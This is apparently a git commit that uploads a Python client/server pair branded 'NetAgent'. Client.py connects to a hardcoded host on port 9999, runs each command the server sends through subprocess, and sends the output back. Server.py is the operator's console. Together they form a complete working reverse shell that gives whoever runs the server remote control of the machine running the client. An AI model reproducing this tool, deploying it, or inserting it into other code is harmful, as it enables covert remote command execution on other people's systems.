4c7f1b19a97cf6c004f38f2c7218936287779598
sudo-scorpion <mrk850408@gmail.com>
2026-01-29 13:11:41 +0000

    Add files via upload

---
+++ Client.py
@@ -0,0 +1,54 @@
+import socket
+import subprocess
+import os
+import shlex
+
+
+
+host = "192.168.0.247"
+port = 9999
+
+# CREATE SOCKET
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+print(s.recv(1024).decode())
+
+cwd = os.getcwd()
+
+while True:
+    cmd = s.recv(1024).decode().strip()
+    print(f"[+] received command: {cmd}")
+
+    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+        break
+
+    if cmd.startswith("cd"):
+        try:
+            path = cmd.split(maxsplit=1)[1]
+            os.chdir(path)
+            cwd = os.getcwd()
+            result = cwd.encode()
+        except Exception as e:
+            result = str(e).encode()
+    else:
+        try:
+
+            args = shlex.split(cmd)
+
+            result = subprocess.check_output(
+                args,
+                stderr=subprocess.STDOUT,
+                cwd=cwd
+            )
+        except subprocess.CalledProcessError as e:
+            result = e.output
+        except Exception as e:
+            result = str(e).encode()
+
+    if not result:
+        result = b"[+] Executed"
+
+    s.send(result)
+
+s.close()
---
+++ Server.py
@@ -0,0 +1,59 @@
+
+import socket
+from colorama import Fore, Back, Style
+
+
+
+def socket_create():
+    global host, port, s
+    host = "192.168.0.247"
+    port = 9999
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((host, port))
+    s.listen(1)
+
+socket_create()
+
+print(Back.BLACK+Fore.YELLOW+"""
+
+
+
+ ██████   █████           █████      █████████                                 █████   
+░░██████ ░░███           ░░███      ███░░░░░███                               ░░███    
+ ░███░███ ░███   ██████  ███████   ░███    ░███   ███████  ██████  ████████   ███████  
+ ░███░░███░███  ███░░███░░░███░    ░███████████  ███░░███ ███░░███░░███░░███ ░░░███░   
+ ░███ ░░██████ ░███████   ░███     ░███░░░░░███ ░███ ░███░███████  ░███ ░███   ░███    
+ ░███  ░░█████ ░███░░░    ░███ ███ ░███    ░███ ░███ ░███░███░░░   ░███ ░███   ░███ ███
+ █████  ░░█████░░██████   ░░█████  █████   █████░░███████░░██████  ████ █████  ░░█████ 
+░░░░░    ░░░░░  ░░░░░░     ░░░░░  ░░░░░   ░░░░░  ░░░░░███ ░░░░░░  ░░░░ ░░░░░    ░░░░░  
+                                                 ███ ░███                              
+                                                ░░██████                               
+                                                 ░░░░░░                       by sudo-scorpion""")
+
+print(Style.RESET_ALL)
+
+while True:
+    print(Fore.GREEN+f'[*] listening as {host}:{port}')
+    conn, addr = s.accept()
+    print(Fore.GREEN+f'[+] client connected {addr}')
+
+    conn.send(b'connected')
+
+
+    while True:
+        cmd = input('>>> ')
+        conn.send(cmd.encode())
+
+        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+            break
+
+        result = conn.recv(1024).decode()
+        print(result)
+
+    conn.close()
+
+    if input(Fore.RED+'Wait for new client y/n ') == 'n':
+        break
+
+s.close()
